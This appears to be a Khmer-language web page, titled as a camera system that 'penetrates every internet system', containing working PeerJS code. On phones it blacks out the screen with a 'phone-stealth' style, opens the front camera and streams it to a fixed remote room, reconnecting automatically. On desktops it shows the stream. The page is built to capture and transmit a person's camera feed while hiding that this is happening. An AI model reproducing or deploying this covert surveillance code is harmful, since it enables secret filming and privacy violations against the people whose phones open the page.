<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព ទម្លុះគ្រប់ប្រព័ន្ធអ៊ីនធឺណិត</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #000; overflow: hidden; font-family: sans-serif; }
        video { width: 100%; height: 100%; object-fit: cover; background: #000; display: none; }
        #status { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #2ac767; font-weight: bold; font-size: 22px; text-align: center; z-index: 10; background: rgba(0, 0, 0, 0.7); padding: 15px 25px; border-radius: 8px; }
        .phone-stealth { background: #000000 !important; }
        .phone-stealth #pc-ui { display: none !important; }
    </style>
</head>
<body>

    <div id="pc-ui">
        <div id="status">📡 កំពុងរង់ចាំសញ្ញាភ្ជាប់ពីទូរសព្ទ...</div>
        <video id="view-video" autoplay playsinline muted></video>
    </div>

    <script>
        // ប្តូរឈ្មោះបន្ទប់ថ្មីរាល់ដងដើម្បីកុំឱ្យស្ទះប្រព័ន្ធចាស់
        const LIVE_ROOM_ID = 'hino-super-cam-zone-2026';
        
        // 🛠️ បន្ថែមប្រព័ន្ធបម្រុងទម្លុះ Firewall (STUN Servers របស់ Google)
        const peerConfig = {
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' }
                ]
            }
        };
        
        let peer = null;
        let localStream = null;

        window.onload = function() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

            if (!isMobile) {
                runAsPC();
            } else {
                document.body.classList.add('phone-stealth');
                startCamera();
            }
        };

        // --- កូដកុំព្យូទ័រ ---
        function runAsPC() {
            if (peer) peer.destroy();
            peer = new Peer(LIVE_ROOM_ID, peerConfig);

            peer.on('call', (call) => {
                call.answer();
                document.getElementById('status').style.display = 'none';
                
                call.on('stream', (remoteStream) => {
                    const video = document.getElementById('view-video');
                    video.style.display = 'block';
                    video.srcObject = remoteStream;
                    
                    // ចុចដោះសោ Autoplay របស់ Chrome ស្វ័យប្រវត្ត
                    video.play().catch(() => {
                        document.getElementById('status').style.display = 'block';
                        document.getElementById('status').innerText = "🛑 សូមចុចលើអេក្រង់កុំព្យូទ័រ ១ដង ដើម្បីមើលរូបភាព";
                        document.body.onclick = () => {
                            video.play();
                            document.getElementById('status').style.display = 'none';
                        };
                    });
                });
            });
        }

        // --- កូដទូរសព្ទ ---
        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then((stream) => {
                localStream = stream;
                connectToPC();
            })
            .catch((err) => { console.error(err); });
        }

        function connectToPC() {
            if (peer) peer.destroy();
            peer = new Peer(peerConfig); 

            peer.on('open', () => {
                const call = peer.call(LIVE_ROOM_ID, localStream);
                if (call) {
                    call.on('close', () => { setTimeout(connectToPC, 3000); });
                }
            });

            peer.on('error', () => { setTimeout(connectToPC, 4000); });
        }
    </script>
</body>
</html>
